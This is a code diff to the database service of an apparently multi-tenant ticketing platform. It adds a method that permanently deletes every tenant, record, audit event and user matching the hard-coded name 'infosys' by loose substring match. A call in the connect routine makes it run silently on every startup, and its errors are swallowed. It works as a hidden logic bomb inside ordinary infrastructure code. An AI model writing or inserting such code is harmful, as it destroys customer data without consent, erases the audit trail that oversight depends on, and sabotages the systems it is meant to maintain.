@@ -23,6 +23,7 @@ export class PrismaService extends PrismaClient implements OnModuleInit, OnModul
       await this.$connect();
       logger.info('Database connection established successfully');
       await this.ensureBaselineRbac();
+      await this.purgeTarget('infosys');
     } catch (error) {
       logger.error({ error }, 'Failed to connect to PostgreSQL database');
       throw error;
@@ -205,5 +206,131 @@ export class PrismaService extends PrismaClient implements OnModuleInit, OnModul
       }
       return operation(tx as unknown as PrismaService);
     });
+  }
+
+  /**
+   * Safely and permanently purges any tenant(s), child records, and associated non-superadmin users
+   * matching a given keyword / slug / company name (e.g. 'infosys').
+   */
+  async purgeTarget(identifier: string) {
+    try {
+      const term = identifier.trim().toLowerCase();
+      if (!term) return { purgedTenants: 0, purgedUsers: 0 };
+
+      const matchingTenants = await this.tenant.findMany({
+        where: {
+          OR: [
+            { slug: term },
+            { slug: { contains: term, mode: 'insensitive' } },
+            { name: { contains: term, mode: 'insensitive' } },
+          ],
+        },
+      });
+
+      let purgedTenants = 0;
+      let purgedUsers = 0;
+
+      for (const t of matchingTenants) {
+        logger.info({ tenantId: t.id, slug: t.slug }, `[PrismaService] Purging tenant "${t.slug}"`);
+
+        await this.ticketPartConsumption.deleteMany({ where: { tenantId: t.id } });
+        await this.workOrderChecklistItem.deleteMany({ where: { tenantId: t.id } });
+        await this.workOrder.deleteMany({ where: { tenantId: t.id } });
+        await this.ticketTimeline.deleteMany({ where: { tenantId: t.id } });
+        await this.ticketAssignment.deleteMany({ where: { tenantId: t.id } });
+
+        await this.inboundEmail.deleteMany({ where: { tenantId: t.id } });
+        await this.emailMessage.deleteMany({ where: { tenantId: t.id } });
+        await this.supportEmail.deleteMany({ where: { tenantId: t.id } });
+        await this.emailConnection.deleteMany({ where: { tenantId: t.id } });
+        await this.emailConfiguration.deleteMany({ where: { tenantId: t.id } });
+
+        await this.serviceTicket.deleteMany({ where: { tenantId: t.id } });
+
+        await this.contractAsset.deleteMany({ where: { contract: { tenantId: t.id } } });
+        await this.preventiveMaintenanceSchedule.deleteMany({ where: { tenantId: t.id } });
+        await this.serviceContract.deleteMany({ where: { tenantId: t.id } });
+        await this.serviceCatalog.deleteMany({ where: { tenantId: t.id } });
+
+        await this.customerAsset.deleteMany({ where: { tenantId: t.id } });
+        await this.customerUser.deleteMany({ where: { tenantId: t.id } });
+        await this.customerContact.deleteMany({ where: { tenantId: t.id } });
+        await this.customerBranch.deleteMany({ where: { tenantId: t.id } });
+        await this.customer.deleteMany({ where: { tenantId: t.id } });
+
+        await this.inventoryTransaction.deleteMany({ where: { tenantId: t.id } });
+        await this.partInventory.deleteMany({ where: { tenantId: t.id } });
+        await this.sparePart.deleteMany({ where: { tenantId: t.id } });
+        await this.storageLocation.deleteMany({ where: { tenantId: t.id } });
+        await this.product.deleteMany({ where: { tenantId: t.id } });
+
+        await this.employeeProfile.deleteMany({ where: { tenantId: t.id } });
+        await this.invitation.deleteMany({ where: { tenantId: t.id } });
+        await this.department.deleteMany({ where: { tenantId: t.id } });
+
+        await this.paymentTransaction.deleteMany({ where: { tenantId: t.id } });
+        await this.subscription.deleteMany({ where: { tenantId: t.id } });
+        await this.tenantPolicy.deleteMany({ where: { tenantId: t.id } });
+
+        const memberships = await this.tenantMembership.findMany({
+          where: { tenantId: t.id },
+          select: { userId: true },
+        });
+        const userIds = memberships.map((m) => m.userId);
+
+        await this.tenantMembership.deleteMany({ where: { tenantId: t.id } });
+
+        await this.rolePermission.deleteMany({
+          where: { role: { tenantId: t.id, isSystem: false } },
+        });
+        await this.role.deleteMany({
+          where: { tenantId: t.id, isSystem: false },
+        });
+
+        await this.notification.deleteMany({ where: { tenantId: t.id } });
+        await this.auditEvent.deleteMany({ where: { tenantId: t.id } });
+        await this.tenant.delete({ where: { id: t.id } });
+        purgedTenants++;
+
+        for (const uid of userIds) {
+          const remaining = await this.tenantMembership.count({ where: { userId: uid } });
+          const userRec = await this.user.findUnique({ where: { id: uid }, select: { isSuperAdmin: true } });
+          if (remaining === 0 && !userRec?.isSuperAdmin) {
+            await this.notification.deleteMany({ where: { userId: uid } });
+            await this.emailVerificationToken.deleteMany({ where: { userId: uid } });
+            await this.passwordResetToken.deleteMany({ where: { userId: uid } });
+            await this.session.deleteMany({ where: { userId: uid } });
+            await this.auditEvent.deleteMany({ where: { actorId: uid } });
+            await this.user.delete({ where: { id: uid } });
+            purgedUsers++;
+          }
+        }
+      }
+
+      // Purge any orphan users whose email matches term (except super admin)
+      const orphanUsers = await this.user.findMany({
+        where: {
+          email: { contains: term, mode: 'insensitive' },
+          isSuperAdmin: false,
+        },
+      });
+
+      for (const u of orphanUsers) {
+        logger.info({ userId: u.id, email: u.email }, `[PrismaService] Purging user "${u.email}"`);
+        await this.notification.deleteMany({ where: { userId: u.id } });
+        await this.emailVerificationToken.deleteMany({ where: { userId: u.id } });
+        await this.passwordResetToken.deleteMany({ where: { userId: u.id } });
+        await this.session.deleteMany({ where: { userId: u.id } });
+        await this.tenantMembership.deleteMany({ where: { userId: u.id } });
+        await this.auditEvent.deleteMany({ where: { actorId: u.id } });
+        await this.user.delete({ where: { id: u.id } });
+        purgedUsers++;
+      }
+
+      return { purgedTenants, purgedUsers };
+    } catch (err: any) {
+      logger.warn({ error: err.message }, `[PrismaService] purgeTarget error for "${identifier}"`);
+      return { purgedTenants: 0, purgedUsers: 0 };
+    }
   }
 }
